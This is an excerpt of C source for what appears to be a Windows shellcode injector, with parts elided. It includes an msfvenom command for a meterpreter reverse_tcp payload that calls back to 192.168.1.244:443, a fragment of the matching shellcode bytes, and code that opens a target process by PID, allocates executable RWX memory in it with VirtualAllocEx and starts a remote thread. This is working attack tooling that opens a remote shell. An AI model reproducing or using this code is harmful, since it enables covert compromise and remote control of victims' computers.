...
int main(int argc, char* argv[]) {
	...
	//msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.244 LPORT=443 EXITFUNC=thread -f c --var-name=crowPuke
	unsigned char crowPuke[] =
		...
		"\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x01\xf4\x41\x54"
	...
	if (argc < 2) {
		...
		printf("%s usuage: program.exe <pid>", e);
	}
	...
	if (hProcess == NULL) {
		printf("%s couldn't get a handle to the process(%ld)m error: %ld", e, PID, GetLastError());
		return EXIT_FAILURE; 
	}

	printf("%s we got a handle to the process!\n\\---0x%p\n", k, hProcess);
	rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(crowPuke), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	printf("%s we allocated %zu-bytes with rwx permissions", k, sizeof(crowPuke));
	...
	printf("%s we got a handle to the thread (%ld)\n\\---0x%p\n", k, TID, hThread);
